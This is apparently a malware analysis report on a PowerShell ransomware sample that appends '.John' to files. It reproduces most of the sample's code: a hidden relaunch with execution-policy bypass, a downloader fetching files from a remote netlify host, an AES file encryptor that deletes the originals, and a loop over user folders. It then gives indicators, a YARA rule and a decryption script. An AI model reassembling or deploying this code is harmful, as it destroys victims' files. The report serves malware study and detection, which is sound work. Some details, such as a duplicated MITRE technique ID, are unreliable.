
# Analysis of Trojan-Ransom.Win32.Encoder (PowerShell Ransomware)

## Introduction

This report presents a detailed technical analysis of a malware sample classified as **Trojan-Ransom.Win32.Encoder**, a ransomware written entirely in PowerShell targeting Windows systems. The script uses AES-128-CBC encryption to lock user files and demands a ransom payment via gift cards.

According to VirusTotal:

- **SHA256**: af2a278c76aeb3702c73db10b7081de8e18ca6518c3a2c78a20394f0df9a3359  
- **Classification**: Ransomware, file encryptor  
- **Distribution**: Likely spread via email attachments, social engineering, or dropper malware  
- **Target Platform**: Windows (PowerShell-based)  
- **C2 Infrastructure**: `website-test-123.netlify.app`  
- **Contact Email**: johnhammond010@gmail.com  

This malware is particularly interesting due to its **intentional vulnerability**: the encryption key is written in clear text in the ransom note, making file recovery trivial. This suggests it may be a **proof-of-concept** or **educational challenge** rather than a real-world threat, especially given the reference to **John Hammond**, a well-known cybersecurity educator and CTF creator.

## General Behavior

This ransomware displays several typical behaviors:

- **Stealth execution**: Relaunches itself with hidden window and bypassed execution policy
- **Resource download**: Fetches custom icon and wallpaper from remote server
- **AES-128-CBC encryption**: Encrypts user files with cryptographically secure algorithm
- **System modification**: Changes desktop wallpaper and file associations
- **Ransom demand**: Creates a ransom note demanding $20 in gift cards
- **File extension modification**: Appends `.John` extension to encrypted files

Example of the ransom note created:

```
!!! YOUR FILES ARE ENCRYPTED !!!

To decrypt your files, you need:
- This file
- The decryption tool (contact us)

Your personal ID:
[KEY IN HEXADECIMAL]

IV: [IV IN HEXADECIMAL]

Send 20$ Worth Of Gift Card  to: JohnHammond 

After payment, send us:
- This file
- Transaction ID

Email: johnhammond010@gmail.com
```

## Technical Analysis

### Function: Initialization and Stealth

```powershell
$ErrorActionPreference = "SilentlyContinue"

if ($host.Name -ne "ConsoleHost") {
    powershell -WindowStyle Hidden -EP Bypass -Command $MyInvocation.MyCommand.Definition
    exit
}
```

**Analysis**: 
- Suppresses all error messages to avoid detection
- Checks if running in a non-console host (e.g., ISE, launched from shortcut)
- If detected, relaunches itself with:
  - `-WindowStyle Hidden`: No visible window
  - `-EP Bypass`: Ignores PowerShell execution policy restrictions

---

### Function: Resource Download with Fallback Mechanisms

```powershell
function Download-File {
    param($Url, $Path)
    try { (New-Object Net.WebClient).DownloadFile($Url, $Path); if (Test-Path $Path) { return $true } } catch {}
    try { Invoke-WebRequest $Url -OutFile $Path -UseBasicParsing; if (Test-Path $Path) { return $true } } catch {}
    try { Start-BitsTransfer -Source $Url -Destination $Path; if (Test-Path $Path) { return $true } } catch {}
    return $false
}

if (-not (Download-File $IconUrl $TempIcon)) { exit }
if (-not (Download-File $WallpaperUrl $TempWallpaper)) { exit }
```

**Analysis**:
- Implements **three different download methods** to ensure success across various Windows configurations:
  1. **WebClient**: Classic .NET method, fast and reliable
  2. **Invoke-WebRequest**: PowerShell native cmdlet
  3. **BITS Transfer**: Background Intelligent Transfer Service (may bypass some firewalls)
- Each method validates the downloaded file exists before returning
- Script terminates if downloads fail, preventing execution without visual assets

**URLs used**:
- Icon: `http://website-test-123.netlify.app/John.ico`
- Wallpaper: `http://website-test-123.netlify.app/dox.jpg`

---

### Function: AES-128-CBC Encryption Engine

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
public class AES128CBC {
    public static void EncryptFile(string inputFile, string outputFile, byte[] key, byte[] iv) {
        using (Aes aes = Aes.Create()) {
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;

            using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
            using (CryptoStream cs = new CryptoStream(fsOut, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
                fsIn.CopyTo(cs);
            }
        }
        File.Delete(inputFile);
    }
}
'@
```

**Analysis**:
- Uses `Add-Type` to compile and load C# code dynamically at runtime
- **Encryption parameters**:
  - **Algorithm**: AES (Advanced Encryption Standard)
  - **Key size**: 128 bits (16 bytes)
  - **Block size**: 128 bits
  - **Mode**: CBC (Cipher Block Chaining)
  - **Padding**: PKCS7 (standard padding scheme)
- **File handling**:
  - Reads original file in a stream
  - Encrypts data through `CryptoStream`
  - Writes encrypted output to new file
  - **Destroys original file** with `File.Delete()` after encryption

---

### Function: Cryptographic Key Generation

```powershell
$Key = New-Object Byte[] 16
$IV  = New-Object Byte[] 16
$RNG = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$RNG.GetBytes($Key)
$RNG.GetBytes($IV)
$RNG.Dispose()
```

**Analysis**:
- Creates two 16-byte (128-bit) arrays for Key and IV
- Uses **cryptographically secure random number generator** (RNGCryptoServiceProvider internally)
- **Each execution generates unique keys**, preventing universal decryption tools
- Properly disposes of RNG object after use

**Cryptographic strength**: This is a **secure key generation method** suitable for production ransomware. However...

---

### Critical Vulnerability: Key Exposure in Ransom Note

```powershell
$NoteContent = @"
!!! YOUR FILES ARE ENCRYPTED !!!

To decrypt your files, you need:
- This file
- The decryption tool (contact us)

Your personal ID:
$([BitConverter]::ToString($Key) -replace '-','')

IV: $([BitConverter]::ToString($IV) -replace '-','')

Send 20$ Worth Of Gift Card  to: JohnHammond 
"@
Set-Content -Path $NotePath -Value $NoteContent -Encoding UTF8
```

**Analysis**:
- **CRITICAL FLAW**: The encryption key and IV are written in hexadecimal format directly into the ransom note
- This makes decryption **trivial** for anyone with basic programming knowledge
- Example key format: `A3F2E1D4B5C6A7F8E9D0C1B2A3F4E5D6`
- File path: `C:\Users\Public\Desktop\HOW_TO_DECRYPT.txt`

**Impact**: This vulnerability completely defeats the purpose of ransomware, suggesting this is intentionally designed as:
- Educational malware sample
- CTF (Capture The Flag) challenge
- Security training exercise

---

### Function: System Modification - Wallpaper Change

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@

[Wallpaper]::SystemParametersInfo(20, 0, $TempWallpaper, 3) | Out-Null
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $TempWallpaper
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "WallpaperStyle" -Value "2"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "TileWallpaper" -Value "0"
```

**Analysis**:
- Uses **P/Invoke** to call native Windows API `SystemParametersInfo`
- **Parameters**:
  - `uAction = 20` (SPI_SETDESKWALLPAPER): Sets desktop wallpaper
  - `uParam = 0`: Not used
  - `lpvParam`: Path to wallpaper image
  - `fuWinIni = 3` (SPIF_UPDATEINIFILE | SPIF_SENDCHANGE): Updates user profile and broadcasts change
- **Registry modifications**:
  - `WallpaperStyle = 2`: Stretch wallpaper to fit screen
  - `TileWallpaper = 0`: Do not tile

**Psychological impact**: Changing the wallpaper to a threatening image is a common ransomware tactic to create panic and urgency.

---

### Function: File Association Hijacking

```powershell
$extKey   = "HKCU:\Software\Classes\$FakeExt"
$classKey = "HKCU:\Software\Classes\JohnFile"

New-Item -Path $extKey -Value "JohnFile" -Force | Out-Null
New-Item -Path "$classKey\DefaultIcon" -Force | Out-Null
Set-Item -Path "$classKey\DefaultIcon" -Value "$TempIcon,0"

New-Item -Path "$classKey\shell\open\command" -Force | Out-Null
Set-Item -Path "$classKey\shell\open\command" -Value "notepad.exe `"%1`""
```

**Analysis**:
- Creates custom file type association for `.John` extension
- **Registry keys created**:
  - `HKCU:\Software\Classes\.John` → Points to "JohnFile" class
  - `HKCU:\Software\Classes\JohnFile\DefaultIcon` → Sets custom icon
  - `HKCU:\Software\Classes\JohnFile\shell\open\command` → Defines open action
- **Effect**: All `.John` files display the downloaded icon and open with Notepad
- **User impact**: Victims will see distinctive icons for all encrypted files, reinforcing the attack's visibility

---

### Function: File Encryption Loop

```powershell
$folders = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos"
)

foreach ($folder in $folders) {
    if (Test-Path $folder) {
        Get-ChildItem $folder -File -Recurse -ErrorAction SilentlyContinue | Where-Object {
            $_.Extension -notin @(".john", ".ico", ".jpg", ".lnk", ".url", ".ini", ".sys", ".dll", ".exe", ".com", ".scr", ".bat", ".ps1", ".vbs")
        } | ForEach-Object {
            $encryptedPath = $_.FullName + $FakeExt
            try {
                [AES128CBC]::EncryptFile($_.FullName, $encryptedPath, $Key, $IV)
            } catch {}
        }
    }
}
```

**Analysis**:
- **Target directories** (5 most valuable user locations):
  - Desktop
  - Downloads
  - Documents
  - Pictures
  - Videos

- **Recursive traversal**: Searches all subdirectories with `Get-ChildItem -Recurse`

- **File filter**: **Excludes** system-critical and already-encrypted files:
  - `.john` - Already encrypted
  - `.ico, .jpg` - Downloaded resources
  - `.lnk, .url, .ini` - System files
  - `.sys, .dll` - System libraries
  - `.exe, .com, .scr` - Executables
  - `.bat, .ps1, .vbs` - Scripts

- **Encryption process**:
  1. Constructs new filename: `original.txt` → `original.txt.John`
  2. Calls `AES128CBC::EncryptFile()` with generated key/IV
  3. Original file is deleted inside the encryption function
  4. Errors are suppressed with try-catch

**Smart design**: By excluding executables and scripts, the ransomware ensures:
- System remains bootable
- No interference with antivirus or system processes
- Focus on high-value user data

---

### Function: UI Refresh

```powershell
rundll32.exe user32.dll,UpdatePerUserSystemParameters
rundll32.exe shell32.dll,SHChangeNotify,0x8000000,0,0,0
```

**Analysis**:
- **First command**: Forces Windows to reload user-specific system parameters (wallpaper change)
- **Second command**: Notifies Shell of global changes
  - `0x8000000` = SHCNE_ASSOCCHANGED: File associations have changed
  - Forces Explorer to refresh icon cache and file associations

**Effect**: Immediate visual feedback - wallpaper and icons change without requiring logout/reboot.

---

## Indicators of Compromise (IOCs)

### Network Indicators
- **C2 Domain**: `website-test-123.netlify.app`
- **HTTP Requests**:
  - `GET /John.ico`
  - `GET /dox.jpg`

### File System Indicators
- **Ransom note**: `C:\Users\Public\Desktop\HOW_TO_DECRYPT.txt`
- **Downloaded files**:
  - `%TEMP%\John.ico`
  - `%TEMP%\dox.jpg`
- **Encrypted files**: `*{original_name}.John`

### Registry Indicators
- **Key**: `HKCU:\Software\Classes\.John`
  - Value: "JohnFile"
- **Key**: `HKCU:\Software\Classes\JohnFile\DefaultIcon`
  - Value: `%TEMP%\John.ico,0`
- **Key**: `HKCU:\Software\Classes\JohnFile\shell\open\command`
  - Value: `notepad.exe "%1"`
- **Key**: `HKCU:\Control Panel\Desktop\Wallpaper`
  - Value: `%TEMP%\dox.jpg`

### Behavioral Indicators
- PowerShell execution with `-WindowStyle Hidden` and `-EP Bypass`
- Dynamic C# compilation via `Add-Type`
- Recursive file enumeration in user directories
- Mass file encryption operations
- Wallpaper change via `SystemParametersInfo` API
- File association registry modifications

---

## YARA Rule

```yara
rule Trojan_Ransom_Win32_Encoder_PowerShell {
    meta:
        description = "Detects John-themed PowerShell ransomware"
        author = "PetikVX"
        date = "2025-11-16"
        hash = "af2a278c76aeb3702c73db10b7081de8e18ca6518c3a2c78a20394f0df9a3359"
        reference = "Educational ransomware sample"
        severity = "high"

    strings:
        $ps1 = "powershell" nocase
        $aes = "AES128CBC" ascii
        $encrypt = "EncryptFile" ascii
        $key_exposure = "BitConverter]::ToString($Key)" ascii
        $john_ext = ".John" ascii nocase
        $ransom_email = "johnhammond" nocase
        $wallpaper_api = "SystemParametersInfo" ascii
        $gift_card = "Gift Card" nocase
        $fake_ext = "$FakeExt" ascii
        $note_path = "HOW_TO_DECRYPT.txt" ascii nocase
        $netlify = "netlify.app" ascii nocase

    condition:
        uint16(0) == 0x4524 and // PowerShell BOM or '$E' for variable
        $aes and
        $encrypt and
        3 of ($john_ext, $ransom_email, $gift_card, $note_path) and
        ($key_exposure or $wallpaper_api)
}
```

---

## Decryption Proof of Concept

Given the critical flaw where the key is exposed in the ransom note, here's a decryption script:

```powershell
# Extract key and IV from HOW_TO_DECRYPT.txt
$NoteContent = Get-Content "C:\Users\Public\Desktop\HOW_TO_DECRYPT.txt" -Raw

# Parse hex key (example: A3F2E1D4B5C6A7F8E9D0C1B2A3F4E5D6)
$KeyHex = ($NoteContent -match 'Your personal ID:\s*([0-9A-F]+)' | Out-Null; $Matches[1])
$IVHex = ($NoteContent -match 'IV:\s*([0-9A-F]+)' | Out-Null; $Matches[1])

# Convert hex to bytes
$Key = [byte[]]::new(16)
$IV = [byte[]]::new(16)
for ($i = 0; $i -lt 16; $i++) {
    $Key[$i] = [Convert]::ToByte($KeyHex.Substring($i*2, 2), 16)
    $IV[$i] = [Convert]::ToByte($IVHex.Substring($i*2, 2), 16)
}

# Define decryption class
Add-Type -TypeDefinition @'
using System;
using System.Security.Cryptography;
using System.IO;
public class AES128Decrypt {
    public static void DecryptFile(string inputFile, string outputFile, byte[] key, byte[] iv) {
        using (Aes aes = Aes.Create()) {
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;

            using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
            using (CryptoStream cs = new CryptoStream(fsIn, aes.CreateDecryptor(), CryptoStreamMode.Read)) {
                cs.CopyTo(fsOut);
            }
        }
    }
}
'@

# Decrypt all .John files
Get-ChildItem -Path "C:\Users\$env:USERNAME" -Filter "*.John" -Recurse | ForEach-Object {
    $decryptedPath = $_.FullName -replace '\.John$', ''
    [AES128Decrypt]::DecryptFile($_.FullName, $decryptedPath, $Key, $IV)
    Remove-Item $_.FullName
    Write-Host "Decrypted: $decryptedPath"
}
```

---

## Conclusion

This PowerShell ransomware demonstrates several sophisticated techniques:

✅ **Strengths**:
- Cryptographically secure AES-128-CBC encryption
- Multiple download fallback mechanisms
- Comprehensive target directory coverage
- Smart file exclusion to maintain system stability
- Visual impact through wallpaper and icon changes
- Clean code structure with error handling

❌ **Weaknesses (intentional)**:
- **Critical flaw**: Key exposure in ransom note
- No persistence mechanism (one-time execution)
- No network exfiltration of keys
- Low ransom amount ($20 gift card)
- Obvious educational indicators (John Hammond reference)
- Easily detectable PowerShell behavior

**Assessment**: This is almost certainly a **Proof-of-Concept or CTF challenge** designed for educational purposes. The reference to "John Hammond" (a popular cybersecurity YouTuber and CTF creator) and the intentional key exposure strongly suggest this is meant for:
- Security training exercises
- Malware analysis practice
- Understanding ransomware mechanics
- Reverse engineering challenges

**Real-world threat level**: **LOW** - While the encryption is sound, the key exposure makes it trivially reversible. A real ransomware would:
- Exfiltrate keys to remote C2 before encrypting
- Never expose keys locally
- Implement persistence mechanisms
- Target network shares and backups
- Use cryptocurrency for payment

This sample serves as an excellent educational resource for understanding modern ransomware techniques without the destructive permanence of actual malicious software.

---

## References

- **VirusTotal**: [af2a278c76aeb3702c73db10b7081de8e18ca6518c3a2c78a20394f0df9a3359](https://www.virustotal.com/gui/file/af2a278c76aeb3702c73db10b7081de8e18ca6518c3a2c78a20394f0df9a3359)
- **MITRE ATT&CK Techniques**:
  - T1486 (Data Encrypted for Impact)
  - T1027 (Obfuscated Files or Information)
  - T1059.001 (Command and Scripting Interpreter: PowerShell)
  - T1486 (Data Destruction)
  - T1491 (Defacement)
- **Microsoft Documentation**: [SystemParametersInfo function](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfoa)
- **NIST**: [AES Encryption Standard](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf)

---

**Date**: November 16, 2025  
**Analyst**: PetikVX  
**Classification**: Educational Malware / CTF Sample  
**Threat Level**: Low (Reversible)
